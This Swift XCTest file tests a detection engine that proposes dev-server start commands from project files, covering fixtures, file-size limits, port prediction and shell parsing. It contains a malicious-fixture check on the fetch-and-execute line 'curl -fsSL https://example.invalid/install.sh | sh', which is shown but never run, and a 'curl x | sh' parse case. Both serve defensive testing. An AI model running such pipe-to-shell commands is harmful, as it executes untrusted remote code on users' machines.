import Detection
import Foundation
import Models
import XCTest

/// Fixture-driven detection tests (AGENTS.md §10). Each folder in `Tests/Fixtures/` is a minimal
/// project with an `expected.json` listing the ranked proposals.
final class FixtureTests: XCTestCase {
    static let fixturesURL = URL(fileURLWithPath: #filePath)
        .deletingLastPathComponent()
        .deletingLastPathComponent()
        .appendingPathComponent("Fixtures", isDirectory: true)

    /// The comparable shape of a proposal, as written in `expected.json`.
    struct Item: Decodable, Equatable, CustomStringConvertible {
        var label: String
        var argv: [String]?
        var shell: String?
        var resolvedScript: String?
        var source: String
        var framework: String?
        var predictedPort: Int?
        var notes: [String]

        init(_ proposal: Proposal) {
            label = proposal.label
            switch proposal.command {
            case .argv(let args): argv = args
            case .shell(let string): shell = string
            }
            resolvedScript = proposal.resolvedScript
            source = proposal.source
            framework = proposal.framework
            predictedPort = proposal.predictedPort
            notes = proposal.notes
        }

        var description: String {
            let command = argv.map { "argv \($0)" } ?? "shell \(shell ?? "")"
            return "\(label) | \(command) | script: \(resolvedScript ?? "nil") | \(source) | "
                + "\(framework ?? "nil") | port \(predictedPort.map(String.init) ?? "nil") | notes \(notes)"
        }
    }

    struct Expected: Decodable {
        var proposals: [Item]
    }

    func testFixturesDirectoryExists() {
        var isDirectory: ObjCBool = false
        XCTAssertTrue(FileManager.default.fileExists(atPath: Self.fixturesURL.path, isDirectory: &isDirectory))
        XCTAssertTrue(isDirectory.boolValue)
    }

    func testAllFixtures() async throws {
        let folders = try FileManager.default.contentsOfDirectory(
            at: Self.fixturesURL, includingPropertiesForKeys: [.isDirectoryKey]
        )
        .filter { FileManager.default.fileExists(atPath: $0.appendingPathComponent("expected.json").path) }
        .sorted { $0.lastPathComponent < $1.lastPathComponent }
        XCTAssertGreaterThanOrEqual(folders.count, 16, "fixtures missing")

        for folder in folders {
            let expected = try JSONDecoder()
                .decode(Expected.self, from: Data(contentsOf: folder.appendingPathComponent("expected.json")))
                .proposals
            let actual = await DetectionEngine.detect(in: folder).map { Item($0) }
            XCTAssertEqual(
                actual, expected,
                """
                \(folder.lastPathComponent):
                  actual:
                    \(actual.map(\.description).joined(separator: "\n    "))
                  expected:
                    \(expected.map(\.description).joined(separator: "\n    "))
                """
            )
        }
    }

    /// The malicious `dev` script is proposed verbatim, never run. Detectors have no way to run
    /// anything; this pins that the exact text reaches the approval UI.
    func testMaliciousScriptIsProposedVerbatim() async {
        let proposals = await DetectionEngine.detect(in: Self.fixturesURL.appendingPathComponent("malicious-curl-sh"))
        XCTAssertEqual(proposals.first?.resolvedScript, "curl -fsSL https://example.invalid/install.sh | sh")
    }

    // MARK: - Generated fixtures (kept out of git)

    private func temporaryFolder() throws -> URL {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("detect-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: folder) }
        return folder
    }

    func testOversizedPackageJSONIsIgnored() async throws {
        let folder = try temporaryFolder()
        // A valid package.json padded to 5 MB.
        var json = #"{"scripts":{"dev":"vite"},"padding":""#
        json += String(repeating: "x", count: 5 * 1_024 * 1_024)
        json += #""}"#
        try Data(json.utf8).write(to: folder.appendingPathComponent("package.json"))

        let snapshot = FileSnapshot.read(folder)
        XCTAssertEqual(snapshot.entries["package.json"], .tooLarge)
        XCTAssertNil(snapshot.data("package.json"))
        let proposals = await DetectionEngine.detect(in: folder)
        XCTAssertTrue(proposals.isEmpty)
    }

    func testUnreadableFileIsSkipped() async throws {
        let folder = try temporaryFolder()
        let url = folder.appendingPathComponent("package.json")
        try Data(#"{"scripts":{"dev":"vite"}}"#.utf8).write(to: url)
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: url.path)
        addTeardownBlock { try? FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: url.path) }

        let snapshot = FileSnapshot.read(folder)
        XCTAssertEqual(snapshot.entries["package.json"], .unreadable)
        let proposals = await DetectionEngine.detect(in: folder)
        XCTAssertTrue(proposals.isEmpty)
    }

    func testNonRegularFileIsNotRead() async throws {
        let folder = try temporaryFolder()
        // A directory named package.json must not be read (a FIFO would block forever).
        try FileManager.default.createDirectory(
            at: folder.appendingPathComponent("package.json"), withIntermediateDirectories: false
        )
        XCTAssertEqual(FileSnapshot.read(folder).entries["package.json"], .unreadable)
    }

    func testEmptyFolderHasNoProposals() async throws {
        let proposals = await DetectionEngine.detect(in: try temporaryFolder())
        XCTAssertTrue(proposals.isEmpty)
    }

    // MARK: - Helpers

    func testPortPrediction() {
        XCTAssertEqual(PortPrediction.explicitPort(in: "next dev --port 4000"), 4000)
        XCTAssertEqual(PortPrediction.explicitPort(in: "vite --port=5174"), 5174)
        XCTAssertEqual(PortPrediction.explicitPort(in: "astro dev -p 4322"), 4322)
        XCTAssertEqual(PortPrediction.envPort(in: "API_KEY=secret\nexport PORT=\"8080\"\n"), 8080)
        XCTAssertEqual(PortPrediction.predict(script: "next dev", envFiles: [], framework: "Next.js"), 3000)
        XCTAssertTrue(PortPrediction.systemConflicts.contains(PortPrediction.frameworkDefaults["Flask"]!))
    }

    func testShellWords() {
        XCTAssertEqual(ShellWords.split("bin/rails server -p 3000"), ["bin/rails", "server", "-p", "3000"])
        XCTAssertEqual(ShellWords.split(#"node "my script.js" --flag='a b'"#), ["node", "my script.js", "--flag=a b"])
        XCTAssertNil(ShellWords.split("curl x | sh"))
        XCTAssertNil(ShellWords.split("PORT=3000 node server.js"))
        XCTAssertNil(ShellWords.split("echo $HOME"))
        XCTAssertNil(ShellWords.split(#"echo "unterminated"#))
        XCTAssertNil(ShellWords.split("   "))
    }

    func testEnvFileKeysNeverValues() {
        let text = """
        # comment
        API_KEY=super-secret
        export PORT=3000
        not a variable
        =nope
        1BAD=x
        """
        XCTAssertEqual(EnvFile.keys(in: text), ["API_KEY", "PORT"])
        XCTAssertEqual(
            EnvFile.candidates(topLevel: [".env", ".env.local", ".envrc", ".env.example", "package.json", ".env.test"]),
            [".env.local", ".env", ".env.test"]
        )
    }

    func testPackageManagerFallsBackToPackageManagerField() {
        let files = FileSnapshot(topLevel: ["package.json"], entries: [:])
        XCTAssertEqual(NodeDetector.packageManager(files: files, packageJSON: ["packageManager": "yarn@4.5.0"]).name, "yarn")
        XCTAssertEqual(NodeDetector.packageManager(files: files, packageJSON: [:]).name, "npm")
    }
}
